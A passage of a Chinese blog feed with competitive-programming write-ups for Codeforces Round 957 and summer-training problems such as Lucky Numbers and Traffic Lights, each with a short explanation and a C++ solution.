class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 贪心算法，从最远开始向近处枚举</span></span><br><span class="line"><span class="comment">// 题目要求是水中游泳距离不超过 m 米，而不是每段水域都可以游 m 米</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">judge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m, k;</span><br><span class="line">    <span class="type">int</span> pos = <span class="number">0</span>, swim = <span class="number">0</span>;</span><br><span class="line">    string s;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;</span><br><span class="line">    <span class="comment">// 河流的长度 n，ErnKor 可以跳跃的最大距离 m，以及游泳不结冰的最大距离 k。</span></span><br><span class="line">    cin &gt;&gt; s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在字符串 s 的开头和结尾添加 &quot;L&quot;，表示岸边，方便判断</span></span><br><span class="line">    s = <span class="string">&quot;L&quot;</span> + s + <span class="string">&quot;L&quot;</span>;      </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (pos &lt;= n) &#123;</span><br><span class="line">        <span class="keyword">if</span>(s[pos] == <span class="string">&#x27;C&#x27;</span>)    <span class="comment">// 如果当前位置是鳄鱼，则直接退出</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(s[pos] == <span class="string">&#x27;W&#x27;</span>)&#123;   <span class="comment">// 如果当前位置是水，则前进一步，并记录游泳的距离</span></span><br><span class="line">            pos++;</span><br><span class="line">            swim++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">bool</span> jumped = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试从当前位置向后跳跃，优先跳跃到最近的木头</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="built_in">min</span>(pos + m, n + <span class="number">1</span>); i &gt; pos; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">                pos = i;</span><br><span class="line">                jumped = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(jumped)  <span class="comment">// 如果成功跳跃，则继续循环</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 尝试从当前位置向后跳跃，跳跃到水中</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="built_in">min</span>(pos + m, n + <span class="number">1</span>); i &gt; pos; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">&#x27;W&#x27;</span>) &#123;</span><br><span class="line">                pos = i;</span><br><span class="line">                jumped = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!jumped)  <span class="comment">// 如果无法跳跃，则退出</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断是否到达河对岸，并且游泳的距离是否在允许范围内</span></span><br><span class="line">    cout &lt;&lt; (pos &gt; n &amp;&amp; swim &lt;= k ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">        <span class="built_in">judge</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="E"><a href="#E" class="headerlink" title="E"></a>E</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240713145959687.png" alt="image-20240713145959687"></p><p>我们需要找到数字满足<code>a个n - b个n = a*n - b</code>。暴力解法即可，注意字符串的处理。</p><p>参考：</p><p><a href="https://blog.csdn.net/weixin_66946161/article/details/140389453">Codeforces Round 957 (Div. 3 ABCDEFG题) 视频讲解-CSDN博客</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII; <span class="comment">// 定义一个类型别名，表示一对整数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long <span class="comment">// 将 int 定义为 long long 类型</span></span></span><br><span class="line"> <span class="type">int</span> n;</span><br><span class="line"><span class="comment">// 计算整数的位数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dec</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x ) &#123;</span><br><span class="line">        res++;</span><br><span class="line">        x/= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="type">int</span> digit = <span class="built_in">dec</span>(n);</span><br><span class="line">    vector&lt;PII&gt; res; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历可能的 a 值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">1</span>; a &lt;= <span class="number">10000</span>; a++) &#123;</span><br><span class="line">        <span class="comment">// 遍历重复字符串的可能长度</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="built_in">min</span>(<span class="number">6ll</span>, digit * a); i++) &#123;</span><br><span class="line">            string s = <span class="built_in">to_string</span>(n); </span><br><span class="line">            <span class="comment">// 重复字符串直到达到长度 i</span></span><br><span class="line">            <span class="keyword">while</span> (s.<span class="built_in">size</span>() &lt; i) s = s + s;</span><br><span class="line">            <span class="comment">// 如果字符串超过长度 i，则进行截断</span></span><br><span class="line">            <span class="keyword">while</span> (s.<span class="built_in">size</span>() &gt; i) s.<span class="built_in">pop_back</span>();      <span class="comment">//处理两位数及以上的情况</span></span><br><span class="line">            <span class="type">int</span> m = <span class="built_in">stoll</span>(s); </span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span> (m == a * n - (digit * a - i) &amp;&amp; i != digit * a) &#123;</span><br><span class="line">                res.<span class="built_in">emplace_back</span>(a, digit * a - i); <span class="comment">// 将满足条件的对加入结果向量</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出结果的数量</span></span><br><span class="line">    cout &lt;&lt; res.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="comment">// 输出每个结果对</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> v : res) &#123;</span><br><span class="line">        cout &lt;&lt; v.first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; v.second &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n; <span class="comment">// 读取测试用例的数量</span></span><br><span class="line">    <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">        <span class="built_in">solve</span>(); <span class="comment">// 处理每个测试用例</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> codeforces </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024_7_11暑期集训</title>
      <link href="/2024/07/11/%E6%A0%A1%E8%B5%9B/2024_7_11/"/>
      <url>/2024/07/11/%E6%A0%A1%E8%B5%9B/2024_7_11/</url>
      
        <content type="html"><![CDATA[<h3 id="3900-两袋面包"><a href="#3900-两袋面包" class="headerlink" title="3900: 两袋面包"></a>3900: 两袋面包</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240712095707387.png" alt="image-20240712095707387"></p><p>我们只需要按照题意解出即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> y, k, n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (cin &gt;&gt; y &gt;&gt; k &gt;&gt; n) &#123;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n - y; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((i + y) % k == <span class="number">0</span>) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!flag)</span><br><span class="line">      cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      cout &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1231-Lucky-Numbers-easy"><a href="#1231-Lucky-Numbers-easy" class="headerlink" title="1231: Lucky Numbers (easy)"></a>1231: Lucky Numbers (easy)</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240712100229593.png" alt="image-20240712100229593"></p><p>这题可以采用模拟。</p><ul><li>当字符串长度为奇数时，结果应为$\frac{a.length() + 1}2<em>$<code>4</code> + $\frac{a.length() + 1}2 </em>$<code>7</code></li><li>当字符串长度为偶数时<ul><li>若该数大于<code>777...444</code>，则应该长度加2取<code>4444...7777</code></li><li>若该数等于<code>777...444</code>，则直接输出该数</li><li>若该数小于<code>777...444</code>，从高位开始。优先考虑4，然后再考虑7，同时我们要维持flag<ul><li>若有一位大于 输入，说明低位无论如何取值，整个字符串总是大于输入，则更新flag，后面尽可能多填4。</li><li>若有一位等于输入，则填数continue。</li><li>不存在小于输入的问题。</li></ul></li></ul></li><li>注意数据范围，要使用<code>stoll</code>转化为长整型而不是<code>stoi</code>转化为整型。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">string s, res;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cin &gt;&gt; s;</span><br><span class="line">  res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (s.<span class="built_in">length</span>() % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>() + <span class="number">1</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">      res += <span class="string">&quot;4&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>() + <span class="number">1</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">      res += <span class="string">&quot;7&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">      res += <span class="string">&quot;7&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i += <span class="number">2</span>) &#123;</span><br><span class="line">      res += <span class="string">&quot;4&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">stoll</span>(res) &gt; <span class="built_in">stoll</span>(s)) &#123;</span><br><span class="line">      res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">      <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag &amp;&amp; count &lt; s.<span class="built_in">length</span>()/<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            count++;</span><br><span class="line">            res +=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i] &lt; <span class="string">&#x27;4&#x27;</span>&amp;&amp; count &lt; s.<span class="built_in">length</span>()/<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">            res += <span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">&#x27;4&#x27;</span>&amp;&amp; count &lt; s.<span class="built_in">length</span>()/<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            res += <span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i] &lt; <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            res += <span class="string">&#x27;7&#x27;</span>;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i] ==<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            res += <span class="string">&#x27;7&#x27;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">     cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">stoll</span>(res) == <span class="built_in">stoll</span>(s)) &#123;</span><br><span class="line">      cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">stoll</span>(res) &lt; <span class="built_in">stoll</span>(s)) &#123;</span><br><span class="line">      res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>() + <span class="number">2</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        res += <span class="string">&quot;4&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>() + <span class="number">2</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        res += <span class="string">&quot;7&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">        cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时，这道题更方便的做法是使用BFS生成字串，再将该子串与输入进行比较，我们只需要判断4和7的数量是否相等即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>;</span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">judge</span><span class="params">(<span class="type">int</span> tmp)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (tmp) &#123;</span><br><span class="line">    <span class="type">int</span> t = tmp % <span class="number">10</span>;</span><br><span class="line">    tmp /= <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (t == <span class="number">4</span>)</span><br><span class="line">      a++;</span><br><span class="line">    <span class="keyword">if</span> (t == <span class="number">7</span>)</span><br><span class="line">      b++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a == b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  q[++tt] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">    <span class="type">int</span> tmp = q[hh++];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">judge</span>(tmp) &amp;&amp; tmp &gt;= n) &#123;</span><br><span class="line">      cout &lt;&lt; tmp &lt;&lt; endl;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    q[++tt] = tmp * <span class="number">10</span> + <span class="number">4</span>;</span><br><span class="line">    q[++tt] = tmp * <span class="number">10</span> + <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  <span class="built_in">bfs</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2303-Points-on-Plane"><a href="#2303-Points-on-Plane" class="headerlink" title="2303: Points on Plane"></a>2303: Points on Plane</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240712102817594.png" alt="image-20240712102817594"></p><p>//TODO</p><h3 id="3234-Traffic-Lights"><a href="#3234-Traffic-Lights" class="headerlink" title="3234: Traffic Lights"></a>3234: Traffic Lights</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240712102757891.png" alt="image-20240712102757891"></p><p>主要是处理红绿灯的问题，这里可以先将红绿灯时间相加，到达红绿灯的时间除以一轮红绿灯的时间即可得到这是第几轮红绿灯，取余获得该轮第几秒，我们将<code>一轮红绿灯的时间-取余的时间</code>即可得到等待时间。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">double</span> l, d, v, g, r;</span><br><span class="line">  cin &gt;&gt; l &gt;&gt; d &gt;&gt; v &gt;&gt; g &gt;&gt; r;</span><br><span class="line"></span><br><span class="line">  <span class="type">double</span> tmp = d / v; <span class="comment">//时间</span></span><br><span class="line">  <span class="type">double</span> rg = g + r;  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="type">double</span> time = <span class="built_in">fmod</span>(tmp, rg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (time &gt; g) &#123;</span><br><span class="line">    time = rg - time;</span><br><span class="line">    tmp += time;</span><br><span class="line">  &#125;</span><br><span class="line">  tmp += (l - d) / v;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%.8lf&quot;</span>, tmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3861-Lucky-String"><a href="#3861-Lucky-String" class="headerlink" title="3861: Lucky String"></a>3861: Lucky String</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240712103912892.png" alt="image-20240712103912892"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 